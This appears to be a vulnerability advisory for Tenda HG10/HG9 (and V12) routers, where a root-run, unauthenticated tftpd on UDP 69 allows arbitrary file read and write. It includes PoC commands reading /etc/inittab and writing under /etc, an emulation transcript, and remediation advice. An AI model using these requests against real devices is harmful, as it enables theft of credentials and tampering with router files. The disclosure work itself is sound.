# Tenda HG10/HG9 V3.3.0-250113 was discovered to contain an unauthenticated tftpd arbitrary file read and write vulnerability

## Overview

- Vendor: Tenda
- Product: HG10/HG9 (V12 also shares the inetd/tftpd combination)
- Version: V3.3.0-250113 / V56.1.1.11
- Component: inetd + /bin/tftpd, UDP 69
- Vulnerability Class: CWE-306 missing authentication / CWE-732 / CWE-434 / CWE-22
- Manufacturer: https://www.tendacn.com/

## Affected version

- HG10/HG9 package `HG7_HG9_HG10re_300001138.zip`.
- HG10/HG9 `/bin/tftpd`;
  `/bin/inetd`.
- V12 `/bin/tftpd`.

## Vulnerability details

The default `/etc/inetd.conf` starts tftpd as root:

```
tftp    dgram  udp wait   root /bin/tftpd
```

The custom tftpd path handler (`sub_40118C`) accepts absolute paths for both
RRQ and WRQ. No authentication or path confinement is applied. Reads return
arbitrary root-readable files; writes create arbitrary root-writable files.
Writes below 1 MB can trigger the configuration-import/reboot path; larger
writes enter `cmd_upload()`.

## PoC

```python
# RRQ: read an arbitrary absolute path
python3 poc_tftp.py read  <device> /etc/inittab

# WRQ: write an arbitrary absolute path as root
python3 poc_tftp.py write <device> /etc/tftp_abs_proof

# The minimal client is included in the parent project as
# results/20261106-tenda-hg10-tftp-01/poc_tftp.py.
```

## Reproduction and terminal evidence

Environment: qemu-user HG10/HG9 chroot with inetd. The original `/bin/tftpd`
is executed through a small wrapper because the chroot uses qemu-mips-static;
the tftpd binary and the real inetd configuration were not modified.

Terminal transcript:

```
$ ss -lunp | grep :69
UNCONN 0 0 *:69 *:* users:(("inetd",pid=...,fd=...))
$ python3 -I poc_tftp.py read 127.0.0.1 /etc/inittab
# returned 1108 bytes starting with the device inittab
$ python3 -I poc_tftp.py write 127.0.0.1 /etc/tftp_abs_proof
ACK block 1
$ ls -l /etc/tftp_abs_proof
-rw-r--r-- 1 root root ... /etc/tftp_abs_proof   # content: ABS_TFTP_WRITE
```

On V12 the same RRQ/WRQ returns `/etc/inittab` and creates
`/etc/v12_tftp_abs_proof`; evidence `evidence/tftp-rrq-inittab.txt`,
`evidence/tftp-wrq-transcript.txt`, `evidence/v12-tftp-*` (parent project).

## Static evidence

`sub_40118C` accepts absolute paths for RRQ/WRQ; the inetd line runs tftpd as
root. See `evidence/ida-tftpd-path.txt` (parent project).

## Impact

Unauthenticated LAN attacker can read root-readable files (configuration,
credentials, certificates) and write root-writable files. On a writable
filesystem this is a persistence/configuration-integrity issue; on squashfs
the writable `/tmp`/`/var` paths still allow file staging and reboot/import
side effects.

## Remediation

- Remove tftpd from the production inetd configuration or require
  authentication.
- Confine paths to a dedicated directory and reject absolute paths.
- Run tftpd as an unprivileged user with a read-only export.

## Known CVE relation

- NVD keywords `Tenda tftp`, `Tenda tftpd`, `HG10 tftp`, `HG9 tftp` return 0
  records (2026-11-06). The same inetd/tftpd combination exists in V12
  V56.1.1.11; the vendor should confirm whether it is intentional.

## Status and disclosure

Dynamic confirmation (qemu-user; RRQ and WRQ transcripts). Candidate
0-day; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
HG10/HG9 (V12 also shares the inetd/tftpd combination)

### Version or Commit
V3.3.0-250113 / V56.1.1.11

### Vulnerability Class
CWE-306 missing authentication / CWE-732 / CWE-434 / CWE-22

### Description
The default inetd.conf starts /bin/tftpd as root on UDP 69 without authentication, allowing arbitrary file read and write.

### Affected_component
inetd + /bin/tftpd, UDP 69

### Attack_vector
Unauthenticated TFTP request to UDP 69.

### Product_version
HG10/HG9 (V12 also shares the inetd/tftpd combination) V3.3.0-250113 / V56.1.1.11

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/HG10_HG9_V3.3.0-250113/report-5.md
```
